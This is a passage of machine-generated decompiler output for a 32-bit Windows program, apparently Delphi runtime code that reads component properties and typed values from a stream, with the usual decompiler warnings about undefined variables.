  int *v14; // [esp-4h] [ebp-1Ch]
  int v15; // [esp+Ch] [ebp-Ch]
  char *v16; // [esp+10h] [ebp-8h] BYREF
  int *v17; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v16 = 0;
  v17 = a1;
  v14 = &savedregs;
  v13 = &loc_41BB37;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v1 = a1[12];
  if ( v1 )
  {
    v11 = &savedregs;
    v10 = &loc_41BB1A;
    v9 = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&v9);
    v2 = *(_DWORD *)(v1 + 8) - 1;
    if ( v2 >= 0 )
    {
      v15 = v2 + 1;
      v3 = 0;
      do
      {
        v4 = sub_418C80(v17[12], v3);
        sub_404304((volatile __int32 *)&v16, *(_DWORD *)(v4 + 20));
        (*(void (__cdecl **)(struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *, struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *))(*v17 + 32))(
          v9,
          v10,
          v11,
          ExceptionList,
          v13,
          v14);
        v5 = sub_41B558(*(_DWORD *)(v4 + 8), v16);
        v6 = sub_418C80(v17[12], v3);
        sub_41B9AC(v6);
        if ( v5 || !sub_41B47C(v4) )
        {
          (**(void (***)(void))v4)();
        }
        else
        {
          v7 = sub_418C80(v17[12], v3);
          sub_418EFC(dword_42CBD4, v7);
          sub_418D08((_DWORD *)v17[12], v3, 0);
        }
        ++v3;
        --v15;
      }
      while ( v15 );
    }
    __writefsdword(0, (unsigned int)v9);
    v11 = (int *)&loc_41BB21;
    sub_41BB6C((int)v17);
  }
  __writefsdword(0, (unsigned int)ExceptionList);
  v14 = (int *)&loc_41BB3E;
  return sub_40426C(&v16);
}
// 42CBD4: using guessed type int dword_42CBD4;

//----- (0041BB48) --------------------------------------------------------
int __usercall sub_41BB48@<eax>(int *a1@<eax>)
{
  int v2; // eax
  int result; // eax

  v2 = sub_41BC3C(a1);
  sub_41AAC0(a1[1], v2, v2 >> 31);
  a1[4] = 0;
  result = 0;
  a1[5] = 0;
  return result;
}

//----- (0041BB6C) --------------------------------------------------------
int __usercall sub_41BB6C@<eax>(int a1@<eax>)
{
  int result; // eax
  int v3; // esi
  int v4; // edi
  _DWORD *v5; // eax

  result = *(_DWORD *)(a1 + 48);
  if ( result )
  {
    if ( *(_DWORD *)(result + 8) - 1 >= 0 )
    {
      v3 = *(_DWORD *)(result + 8);
      v4 = 0;
      do
      {
        v5 = (_DWORD *)sub_418C80(*(_DWORD *)(a1 + 48), v4);
        sub_403534(v5);
        ++v4;
        --v3;
      }
      while ( v3 );
    }
    sub_403534(*(_DWORD **)(a1 + 48));
    result = 0;
    *(_DWORD *)(a1 + 48) = 0;
  }
  return result;
}

//----- (0041BBA8) --------------------------------------------------------
int __usercall sub_41BBA8@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int (**i)(); // ebp
  __int16 *v4; // eax
  __int16 *v5; // esi
  int v6; // ebx
  int v7; // edi
  int v8; // eax
  int v12; // [esp+8h] [ebp-14h]

  for ( i = (int (**)())sub_40347C(a2); ; i = (int (**)())sub_4034C0((int)i) )
  {
    if ( i == off_4176E0 )
    {
      v8 = *(_DWORD *)(a1 + 116);
      if ( v8 )
        return sub_41857C(v8, a3);
      else
        return sub_41867C(a3);
    }
    v4 = (__int16 *)sub_418604((int)i);
    v5 = v4;
    if ( v4 )
    {
      if ( *v4 - 1 >= 0 )
        break;
    }
LABEL_7:
    ;
  }
  v6 = *v4;
  v12 = 0;
  while ( 1 )
  {
    v7 = **(_DWORD **)&v5[2 * v12 + 1];
    if ( sub_403498(v7, a3) )
      return v7;
    ++v12;
    if ( !--v6 )
      goto LABEL_7;
  }
}
// 4176E0: using guessed type int (*off_4176E0[3])();

//----- (0041BC3C) --------------------------------------------------------
int __usercall sub_41BC3C@<eax>(int *a1@<eax>)
{
  return sub_41AAA0(a1[1]) - (a1[5] - a1[4]);
}

//----- (0041BC54) --------------------------------------------------------
__int64 __usercall sub_41BC54@<edx:eax>(_DWORD *a1@<eax>, int a2@<ecx>)
{
  __int64 result; // rax

  result = sub_41D0FC(a1, a2);
  --a1[4];
  return result;
}

//----- (0041BC64) --------------------------------------------------------
int __usercall sub_41BC64@<eax>(_DWORD *a1@<eax>, int a2@<ecx>)
{
  sub_41D20C(a1, a2);
  return sub_41B774();
}
// 41B774: using guessed type int sub_41B774(void);

//----- (0041BC78) --------------------------------------------------------
_DWORD *__usercall sub_41BC78@<eax>(_DWORD *result@<eax>, char *a2@<edx>, unsigned int a3@<ecx>)
{
  _DWORD *v5; // esi
  unsigned int v6; // ecx
  bool v7; // cc
  unsigned int v8; // ecx
  char v9; // dl
  unsigned int v10; // ecx
  char *v11; // edi
  char *v12; // esi
  int v13; // ecx
  _DWORD *v14; // [esp-4h] [ebp-10h]

  v5 = result;
  while ( a3 )
  {
    v6 = v5[5];
    v7 = v6 <= v5[4];
    v8 = v6 - v5[4];
    if ( v7 )
    {
      sub_41BCC4(v8);
      v8 = v5[5];
    }
    if ( v8 >= a3 )
      v8 = a3;
    v14 = v5;
    a3 -= v8;
    result = (_DWORD *)(v5[4] + v5[2]);
    v5[4] += v8;
    v9 = v8;
    v10 = v8 >> 2;
    qmemcpy(a2, result, 4 * v10);
    v12 = (char *)&result[v10];
    v11 = &a2[4 * v10];
    v13 = v9 & 3;
    qmemcpy(v11, v12, v13);
    a2 = &v11[v13];
    v5 = v14;
  }
  return result;
}
// 41BCC4: using guessed type int __thiscall sub_41BCC4(_DWORD);

//----- (0041BCC4) --------------------------------------------------------
#error "41BCF1: call analysis failed (funcsize=22)"

//----- (0041BD00) --------------------------------------------------------
_DWORD *__usercall sub_41BD00@<eax>(_DWORD *a1@<eax>)
{
  _DWORD *v1; // ebx
  unsigned int v3[2]; // [esp-10h] [ebp-14h] BYREF
  int *v4; // [esp-8h] [ebp-Ch]
  char *v5; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v5 = 0;
  v1 = a1;
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_41BD4B;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  sub_41CF5C(a1, &v5);
  if ( sub_404524((int)v5) > 1 )
    sub_41B768();
  LOBYTE(v1) = *v5;
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_41BD52;
  sub_40426C(&v5);
  return v1;
}

//----- (0041BD58) --------------------------------------------------------
int __usercall sub_41BD58@<eax>(_DWORD *a1@<eax>, int *a2@<edx>)
{
  int v3; // ecx
  int v4; // ecx
  int v5; // ecx
  int v6; // ecx
  int v7; // ecx
  void *v8; // ecx
  void *v9; // ecx
  unsigned int v11[2]; // [esp-8h] [ebp-14h] BYREF
  int *v12; // [esp+0h] [ebp-Ch]
  int v13; // [esp+4h] [ebp-8h]
  int *v14; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v14 = a2;
  (*(void (__stdcall **)(int *))(*a2 + 32))(v12);
  v12 = &savedregs;
  v11[1] = (unsigned int)&loc_41BDF8;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  if ( !sub_41B910(a1, v3) )
    sub_41947C(v14);
  while ( !sub_41B910(a1, v4) )
  {
    if ( (unsigned __int8)(sub_41BC54(a1, (int)v9) - 2) < 3u )
      sub_41C5FC(a1, v5);
    sub_4193C4((int)v14);
    sub_41C6AC(a1, v6);
    while ( !sub_41B910(a1, v7) )
      sub_41C818();
    sub_41C6B4(v8);
  }
  sub_41C6B4(v9);
  __writefsdword(0, v11[0]);
  return (*(int (__stdcall **)(void *, int, int *))(*v14 + 36))(&loc_41BDFF, v13, v14);
}
// 41BD7B: variable 'v3' is possibly undefined
// 41BD90: variable 'v9' is possibly undefined
// 41BD9D: variable 'v5' is possibly undefined
// 41BDAE: variable 'v6' is possibly undefined
// 41BDC0: variable 'v7' is possibly undefined
// 41BDCB: variable 'v8' is possibly undefined
// 41BDD2: variable 'v4' is possibly undefined
// 41C818: using guessed type int sub_41C818(void);

//----- (0041BE04) --------------------------------------------------------
bool __cdecl sub_41BE04(int a1)
{
  return (*(_BYTE *)(a1 - 1) & 1) == 0 && !*(_DWORD *)(a1 - 8);
}

//----- (0041BE24) --------------------------------------------------------
int __usercall sub_41BE24@<eax>(_DWORD **a1@<eax>, int a2)
{
  int v3; // ebx
  int *v4; // eax

  v3 = 0;
  v4 = (int *)sub_402770();
  if ( sub_4036C0(v4, (int)dword_406E88) )
  {
    if ( sub_41BE04(a2) )
      sub_403534(*a1);
    *a1 = 0;
    sub_41D3F0(*(_DWORD **)(a2 - 12), 0);
    sub_402770();
    return (*(int (**)(void))(**(_DWORD **)(a2 - 12) + 16))();
  }
  return v3;
}
// 406E88: using guessed type int dword_406E88[2];

//----- (0041BE84) --------------------------------------------------------
int __cdecl sub_41BE84(int a1)
{
  int v1; // ecx
  int v2; // ebx
  int result; // eax
  unsigned int v4[3]; // [esp-18h] [ebp-24h] BYREF
  unsigned int v5[6]; // [esp-Ch] [ebp-18h] BYREF
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v5[2] = (unsigned int)&savedregs;
  v5[1] = (unsigned int)&loc_41BF6A;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  v2 = sub_41D590(*(_DWORD *)(a1 - 12), *(_DWORD *)(a1 - 20), v1);
  *(_DWORD *)(a1 - 16) = 0;
  if ( *(_WORD *)(*(_DWORD *)(a1 - 12) + 106) )
    (*(void (__fastcall **)(int, _DWORD, int))(*(_DWORD *)(a1 - 12) + 104))(v2, *(_DWORD *)(a1 - 12), a1 - 16);
  if ( !*(_DWORD *)(a1 - 16) )
  {
    *(_DWORD *)(a1 - 16) = (*(int (**)(void))(v2 - 12))();
    if ( (*(_BYTE *)(a1 - 1) & 4) != 0 )
    {
      *(_WORD *)(*(_DWORD *)(a1 - 16) + 28) |= 1u;
      *(_WORD *)(*(_DWORD *)(a1 - 16) + 28) |= 0x200u;
    }
    v4[2] = (unsigned int)&savedregs;
    v4[1] = (unsigned int)&loc_41BF3E;
    v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v4);
    (*(void (__fastcall **)(_DWORD, int))(**(_DWORD **)(a1 - 16) + 44))(*(_DWORD *)(*(_DWORD *)(a1 - 12) + 40), -1);
    __writefsdword(0, v4[0]);
  }
  *(_WORD *)(*(_DWORD *)(a1 - 16) + 28) |= 1u;
  result = 0;
  __writefsdword(0, v5[0]);
  return result;
}
// 41BEA4: variable 'v1' is possibly undefined

//----- (0041BF94) --------------------------------------------------------
int __cdecl sub_41BF94(int a1)
{
  int result; // eax
  unsigned int v2[6]; // [esp-Ch] [ebp-18h] BYREF
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v2[2] = (unsigned int)&savedregs;
  v2[1] = (unsigned int)&loc_41C00C;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  sub_403714(*(int **)(a1 - 16), -8);
  (*(void (__fastcall **)(int, _DWORD))(**(_DWORD **)(a1 - 12) + 28))(a1 - 24, *(_DWORD *)(a1 - 16));
  if ( (*(_BYTE *)(*(_DWORD *)(a1 - 16) + 28) & 0x10) != 0 && sub_418954() == *(_DWORD *)(a1 - 16) )
    *(_WORD *)(*(_DWORD *)(a1 - 16) + 28) |= 0x200u;
  result = 0;
  __writefsdword(0, v2[0]);
  return result;
}

//----- (0041C034) --------------------------------------------------------
int __cdecl sub_41C034(int a1)
{
  int v1; // ecx
  int v2; // ecx
  int v3; // eax
  int result; // eax
  unsigned int v5[6]; // [esp-Ch] [ebp-18h] BYREF
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v5[2] = (unsigned int)&savedregs;
  v5[1] = (unsigned int)&loc_41C0AF;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  v2 = sub_41D590(*(_DWORD *)(a1 - 12), *(_DWORD *)(a1 - 20), v1);
  *(_DWORD *)(a1 - 16) = (*(int (__fastcall **)(int, _DWORD))(**(_DWORD **)(a1 - 12) + 20))(v2, *(_DWORD *)(a1 - 24));
  sub_403714(*(int **)(a1 - 16), -14);
  *(_DWORD *)(*(_DWORD *)(a1 - 12) + 44) = v3;
  if ( !v3 )
    *(_DWORD *)(*(_DWORD *)(a1 - 12) + 44) = *(_DWORD *)(*(_DWORD *)(a1 - 12) + 24);
  result = 0;
  __writefsdword(0, v5[0]);
  return result;
}
// 41C054: variable 'v1' is possibly undefined
// 41C089: variable 'v3' is possibly undefined

//----- (0041C0D8) --------------------------------------------------------
int __usercall sub_41C0D8@<eax>(_DWORD *a1@<eax>, int a2@<edx>)
{
  int v2; // ecx
  int v3; // ecx
  unsigned int v5[3]; // [esp-20h] [ebp-50h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v6; // [esp-14h] [ebp-44h] BYREF
  void *v7; // [esp-10h] [ebp-40h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-3Ch] BYREF
  void *v9; // [esp-8h] [ebp-38h]
  int *v10; // [esp-4h] [ebp-34h]
  void *v11; // [esp+0h] [ebp-30h]
  int v12; // [esp+Ch] [ebp-24h]
  int v13; // [esp+10h] [ebp-20h]
  int v14; // [esp+14h] [ebp-1Ch] BYREF
  char *v15; // [esp+18h] [ebp-18h] BYREF
  char *v16; // [esp+1Ch] [ebp-14h] BYREF
  int v17; // [esp+20h] [ebp-10h]
  _DWORD *v18; // [esp+24h] [ebp-Ch]
  int v19; // [esp+28h] [ebp-8h]
  char v20; // [esp+2Fh] [ebp-1h] BYREF
  int savedregs; // [esp+30h] [ebp+0h] BYREF

  v16 = 0;
  v15 = 0;
  v19 = a2;
  v18 = a1;
  v10 = &savedregs;
  v9 = &loc_41C29D;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  (*(void (__fastcall **)(int *, char *, struct _EXCEPTION_REGISTRATION_RECORD *))(*a1 + 36))(&v14, &v20, ExceptionList);
  sub_41CF20(v18, &v16, v2);
  sub_41CF20(v18, &v15, v3);
  v13 = v18[11];
  v12 = v18[7];
  ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)&savedregs;
  v7 = &loc_41C27B;
  v6 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v6);
  v17 = v19;
  if ( !v19 )
  {
    if ( (v20 & 1) != 0 )
      sub_41C034((int)&savedregs);
    else
      sub_41BE84((int)&savedregs);
  }
  if ( !v17 )
    goto LABEL_19;
  v5[2] = (unsigned int)&savedregs;
  v5[1] = (unsigned int)&loc_41C239;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  *(_WORD *)(v17 + 28) |= 1u;
  if ( (v20 & 1) == 0 )
    sub_41BF94((int)&savedregs);
  if ( v17 )
  {
    if ( (*(_BYTE *)(v17 + 29) & 2) != 0 )
      v18[7] = v17;
    *(_WORD *)(v17 + 28) |= 2u;
    (*(void (**)(void))(*(_DWORD *)v17 + 20))();
    *(_WORD *)(v17 + 28) &= ~2u;
    if ( (v20 & 2) != 0 )
      sub_403714((int *)v18[11], -7);
    if ( (v20 & 1) == 0 && (*(_BYTE *)(v17 + 29) & 2) == 0 || sub_418CDC(v18[13], v17) < 0 )
      sub_418B44((_DWORD *)v18[13], v17);
    __writefsdword(0, v5[0]);
LABEL_19:
    __writefsdword(0, (unsigned int)v6);
    ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)&loc_41C282;
    v18[11] = v13;
    v18[7] = v12;
    goto LABEL_20;
  }
  __writefsdword(0, v5[0]);
  sub_403D78((unsigned int)v6, (int)v7, (int)ExceptionList);
LABEL_20:
  __writefsdword(0, (unsigned int)v9);
  v11 = &loc_41C2A4;
  sub_404290((int)&v15, 2);
  return v17;
}
// 41C111: variable 'v2' is possibly undefined
// 41C11C: variable 'v3' is possibly undefined

//----- (0041C2B0) --------------------------------------------------------
_DWORD *__usercall sub_41C2B0@<eax>(int *a1@<eax>, int *a2@<edx>, int a3@<ecx>)
{
  int v4; // ecx
  unsigned int v6[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v7; // [esp-4h] [ebp-Ch]
  int *v8; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v8 = a1;
  if ( a1[12] )
    return sub_41C320(v8, a2, a3);
  v8[12] = (int)sub_403504(off_417624, 1);
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_41C30B;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  sub_41C320(v8, a2, v4);
  sub_41BA28(v8);
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_41C31C;
  return (_DWORD *)sub_41BB6C((int)v8);
}
// 41C2E8: variable 'v4' is possibly undefined
// 417624: using guessed type int (*off_417624[4])();

//----- (0041C320) --------------------------------------------------------
_DWORD *__usercall sub_41C320@<eax>(_DWORD *a1@<eax>, int *a2@<edx>, int a3@<ecx>)
{
  void *v4; // ecx
  int v5; // eax
  int v6; // ecx
  int v7; // eax
  void *v8; // ecx
  _DWORD *result; // eax
  unsigned int v10[6]; // [esp-Ch] [ebp-24h] BYREF
  int v11; // [esp+Ch] [ebp-Ch]
  int v12; // [esp+10h] [ebp-8h]
  _DWORD *i; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  for ( i = a1; !sub_41B910(i, a3); sub_41C818(i, a2) )
    ;
  sub_41C6B4(v4);
  v12 = i[11];
  v11 = i[10];
  sub_403714(a2, -5);
  i[11] = v5;
  v10[2] = (unsigned int)&savedregs;
  v10[1] = (unsigned int)&loc_41C3E2;
  v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  sub_403714(a2, -4);
  i[10] = v7;
  if ( !v7 )
    i[10] = i[6];
  while ( !sub_41B910(i, v6) )
    sub_41C0D8(i, 0);
  sub_41C6B4(v8);
  __writefsdword(0, v10[0]);
  i[11] = v12;
  result = i;
  i[10] = v11;
  return result;
}
// 41C33D: variable 'a3' is possibly undefined
// 41C349: variable 'v4' is possibly undefined
// 41C36E: variable 'v5' is possibly undefined
// 41C38F: variable 'v7' is possibly undefined
// 41C3B1: variable 'v6' is possibly undefined
// 41C3BD: variable 'v8' is possibly undefined

//----- (0041C3F0) --------------------------------------------------------
double __usercall sub_41C3F0@<st0>(_DWORD *a1@<eax>, int a2@<ecx>)
{
  int v3; // ecx
  _TBYTE v5; // [esp+0h] [ebp-14h] BYREF

  if ( (unsigned __int8)sub_41D0FC(a1, a2) == 5 )
  {
    sub_41BC78(a1, (char *)&v5, 0xAu);
  }
  else
  {
    --a1[4];
    *(double *)&v5 = (double)(int)sub_41C5FC(a1, v3);
  }
  return *(double *)&v5;
}
// 41C416: variable 'v3' is possibly undefined
// 41C3F0: using guessed type _TBYTE var_14;

//----- (0041C430) --------------------------------------------------------
double __usercall sub_41C430@<st0>(_DWORD *a1@<eax>, int a2@<ecx>)
{
  int v3; // ecx
  float v5; // [esp+0h] [ebp-Ch] BYREF

  if ( (unsigned __int8)sub_41D0FC(a1, a2) == 15 )
  {
    sub_41BC78(a1, (char *)&v5, 4u);
  }
  else
  {
    --a1[4];
    return (float)(int)sub_41C5FC(a1, v3);
  }
  return v5;
}
// 41C456: variable 'v3' is possibly undefined

//----- (0041C470) --------------------------------------------------------
double __usercall sub_41C470@<st0>(_DWORD *a1@<eax>, int a2@<ecx>)
{
  int v3; // ecx
  __int64 v5; // [esp+0h] [ebp-10h] BYREF

  if ( (unsigned __int8)sub_41D0FC(a1, a2) == 16 )
  {
    sub_41BC78(a1, (char *)&v5, 8u);
  }
  else
  {
    --a1[4];
    return (double)(__int64)((double)(int)sub_41C5FC(a1, v3) * 10000.0);
  }
  return (double)v5;
}
// 41C496: variable 'v3' is possibly undefined

//----- (0041C4BC) --------------------------------------------------------
double __usercall sub_41C4BC@<st0>(_DWORD *a1@<eax>, int a2@<ecx>)
{
  int v3; // ecx
  double v5; // [esp+0h] [ebp-10h] BYREF

  if ( (unsigned __int8)sub_41D0FC(a1, a2) == 17 )
  {
    sub_41BC78(a1, (char *)&v5, 8u);
  }
  else
  {
    --a1[4];
    return (double)(int)sub_41C5FC(a1, v3);
  }
  return v5;
}
// 41C4E2: variable 'v3' is possibly undefined

//----- (0041C4FC) --------------------------------------------------------
void *__usercall sub_41C4FC@<eax>(_DWORD *a1@<eax>, volatile __int32 *a2@<edx>, int a3@<ecx>)
{
  char *v5; // eax
  void *result; // eax
  int v7[3]; // [esp+0h] [ebp-Ch] BYREF

  v7[0] = a3;
  switch ( sub_41D0FC(a1, a3) & 0x7F )
  {
    case 0i64:
      result = (void *)sub_4042C0(a2, (__int32)"Null");
      break;
    case 7i64:
      sub_41BC78(a1, (char *)v7, 1u);
      sub_40435C((char **)a2, 0, LOBYTE(v7[0]));
      v5 = sub_404774((char **)a2);
      result = sub_41BC78(a1, v5, LOBYTE(v7[0]));
      break;
    case 8i64:
      result = (void *)sub_4042C0(a2, (__int32)"False");
      break;
    case 9i64:
      result = (void *)sub_4042C0(a2, (__int32)"True");
      break;
    case 0xDi64:
      result = (void *)sub_4042C0(a2, (__int32)dword_41C5E8);
      break;
    default:
      result = (void *)sub_41B768();
      break;
  }
  return result;
}
// 41C5E8: using guessed type int dword_41C5E8[3];
// 41C4FC: using guessed type int var_C[3];

//----- (0041C5FC) --------------------------------------------------------
__int64 __usercall sub_41C5FC@<edx:eax>(_DWORD *a1@<eax>, int a2@<ecx>)
{
  char v3; // al
  char v4; // al
  __int64 v6; // [esp+0h] [ebp-Ch] BYREF

  v3 = sub_41D0FC(a1, a2) - 2;
  if ( v3 )
  {
    v4 = v3 - 1;
    if ( v4 )
    {
      if ( v4 == 1 )
        sub_41BC78(a1, (char *)&v6, 4u);
      else
        sub_41B768();
    }
    else
    {
      sub_41BC78(a1, (char *)&v6 + 6, 2u);
      LODWORD(v6) = SHIWORD(v6);
    }
  }
  else
  {
    sub_41BC78(a1, (char *)&v6 + 4, 1u);
    LODWORD(v6) = SBYTE4(v6);
  }
  return v6;
}

//----- (0041C668) --------------------------------------------------------
__int64 __usercall sub_41C668@<edx:eax>(_DWORD *a1@<eax>, int a2@<ecx>)
{
  int v3; // ecx
  __int64 v5; // [esp+0h] [ebp-Ch] BYREF

  if ( (unsigned __int8)sub_41BC54(a1, a2) != 19 )
    return (int)sub_41C5FC(a1, v3);
  sub_41D0FC(a1, v3);
  sub_41BC78(a1, (char *)&v5, 8u);
  return v5;
}
// 41C67B: variable 'v3' is possibly undefined
// 41C668: using guessed type __int64 var_C;

//----- (0041C6AC) --------------------------------------------------------
int __usercall sub_41C6AC@<eax>(_DWORD *a1@<eax>, int a2@<ecx>)
{
  return sub_41B7DC(a1, 1, a2);
}

//----- (0041C6B4) --------------------------------------------------------
int __thiscall sub_41C6B4(void *this)
{
  return sub_41B7DC(this, 0);
}
// 41B7DC: using guessed type int __fastcall sub_41B7DC(_DWORD, _DWORD);

//----- (0041C6BC) --------------------------------------------------------
char __usercall sub_41C6BC@<al>(_DWORD *a1@<eax>, _BYTE *a2@<edx>, _DWORD *a3@<ecx>)
{
  int v6; // eax
  int v7; // ecx
  int v8; // ecx

  *a2 = 0;
  LOBYTE(v6) = sub_41BC54(a1, (int)a3) & 0xF0;
  if ( (_BYTE)v6 == 0xF0 )
  {
    LOBYTE(v6) = sub_41D0FC(a1, v7) & 0xF;
    *a2 = v6;
    if ( (*a2 & 2) != 0 )
    {
      v6 = sub_41C5FC(a1, v8);
      *a3 = v6;
    }
  }
  return v6;
}
// 41C6DB: variable 'v7' is possibly undefined
// 41C6EB: variable 'v8' is possibly undefined

//----- (0041C6FC) --------------------------------------------------------
_DWORD *__usercall sub_41C6FC@<eax>(int a1@<eax>, int a2)
{
  int v3; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-134h] BYREF
  void *v6; // [esp-8h] [ebp-130h]
  int *v7; // [esp-4h] [ebp-12Ch]
  void *v8; // [esp+0h] [ebp-128h]
  char *v9; // [esp+4h] [ebp-124h] BYREF
  char v10; // [esp+8h] [ebp-120h]
  int v11; // [esp+Ch] [ebp-11Ch]
  char v12; // [esp+10h] [ebp-118h]
  int v13; // [esp+14h] [ebp-114h]
  char v14; // [esp+18h] [ebp-110h]
  int v15; // [esp+1Ch] [ebp-10Ch]
  char v16; // [esp+20h] [ebp-108h]
  char v17[256]; // [esp+24h] [ebp-104h] BYREF
  char *v18; // [esp+124h] [ebp-4h] BYREF
  int savedregs; // [esp+128h] [ebp+0h] BYREF

  v18 = 0;
  v7 = &savedregs;
  v6 = &loc_41C7ED;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_40426C(&v18);
  if ( sub_4036C0(*(int **)(a2 - 4), (int)off_418058) )
    sub_404304((volatile __int32 *)&v18, *(_DWORD *)(*(_DWORD *)(a2 - 4) + 8));
  if ( !v18 )
  {
    sub_403484(**(_DWORD **)(a2 - 4), v17);
    sub_4044C8(&v18, v17);
  }
  v9 = v18;
  v10 = 11;
  v11 = (int)*off_42B8F0[0];
  v12 = 11;
  v13 = *(_DWORD *)(a2 - 8);
  v14 = 11;
  v15 = *(_DWORD *)(a1 + 4);
  v16 = 11;
  v3 = sub_409660((int)dword_417348, 1, off_42BA50[0], 3, (int)&v9);
  sub_403CCC(v3, (int)ExceptionList, (int)v6, (int)v7, (int)v8);
  __writefsdword(0, (unsigned int)v6);
  v8 = &loc_41C7F4;
  return sub_40426C(&v18);
}
// 417348: using guessed type int dword_417348[3];
// 418058: using guessed type int (*off_418058[7])();
// 42B8F0: using guessed type int **off_42B8F0[7];
// 42BA50: using guessed type int **off_42BA50[5];

//----- (0041C7FC) --------------------------------------------------------
int __cdecl sub_41C7FC(int a1)
{
  int v1; // ecx

  sub_41D20C(*(_DWORD **)(a1 - 12), v1);
  return sub_41B750();
}
// 41C805: variable 'v1' is possibly undefined
// 41B750: using guessed type int sub_41B750(void);

//----- (0041C818) --------------------------------------------------------
_DWORD *__usercall sub_41C818@<eax>(_DWORD *a1@<eax>, int *a2@<edx>)
{
  int v2; // ebx
  int v3; // esi
  int v4; // edi
  int v5; // eax
  int v6; // ecx
  _BYTE ***v7; // edi
  int *v8; // eax
  int v9; // eax
  __int32 v10; // eax
  int v11; // ecx
  unsigned int v13[3]; // [esp-24h] [ebp-44h] BYREF
  unsigned int v14[3]; // [esp-18h] [ebp-38h] BYREF
  unsigned int v15[2]; // [esp-Ch] [ebp-2Ch] BYREF
  int *v16; // [esp-4h] [ebp-24h]
  int *v17; // [esp+Ch] [ebp-14h]
  int *v18; // [esp+10h] [ebp-10h]
  _DWORD *v19; // [esp+14h] [ebp-Ch]
  char *v20; // [esp+18h] [ebp-8h] BYREF
  int *v21; // [esp+1Ch] [ebp-4h]
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  v20 = 0;
  v21 = a2;
  v19 = a1;
  v16 = &savedregs;
  v15[1] = (unsigned int)&loc_41C9E8;
  v15[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v15);
  v14[2] = (unsigned int)&savedregs;
  v14[1] = (unsigned int)&loc_41C99D;
  v14[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v14);
  sub_41CF20(a1, &v20, 0);
  v13[2] = (unsigned int)&savedregs;
  v13[1] = (unsigned int)&loc_41C976;
  v13[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v13);
  v2 = 1;
  v3 = sub_404524((int)v20);
  v18 = v21;
  *((_BYTE *)v19 + 120) = 1;
  while ( 1 )
  {
    v4 = v2;
    while ( v3 >= v2 && v20[v2 - 1] != 46 )
      ++v2;
    Delphi_Copy_40477C((int)v20, v4, v2 - v4, (char **)v19 + 28);
    if ( v3 < v2 )
      break;
    v5 = sub_403740(*v18);
    v7 = (_BYTE ***)sub_41656C(v5, (_BYTE *)v19[28]);
    if ( !v7 )
      sub_41BC64(v19, v6);
    v17 = 0;
    if ( ***v7 == 7 )
    {
      LOBYTE(v8) = sub_416660(v18, (int)v7);
      v17 = v8;
    }
    if ( !sub_4036C0(v17, (int)off_4176E0) )
      sub_41C7FC((int)&savedregs);
    v18 = v17;
    ++v2;
  }
  v9 = sub_403740(*v18);
  v10 = sub_41656C(v9, (_BYTE *)v19[28]);
  if ( v10 )
  {
    sub_41CB40(v19, v18, v10, v3);
  }
  else
  {
    *((_BYTE *)v19 + 120) = 0;
    (*(void (**)(void))(*v18 + 4))();
    *((_BYTE *)v19 + 120) = 1;
    if ( v19[28] )
      sub_41BC64(v19, v11);
  }
  __writefsdword(0, v13[0]);
  __writefsdword(0, v14[0]);
  __writefsdword(0, v15[0]);
  v16 = (int *)&loc_41C9EF;
  return sub_40426C(&v20);
}
// 41C8CD: variable 'v6' is possibly undefined
// 41C8EA: variable 'v8' is possibly undefined
// 41C967: variable 'v11' is possibly undefined
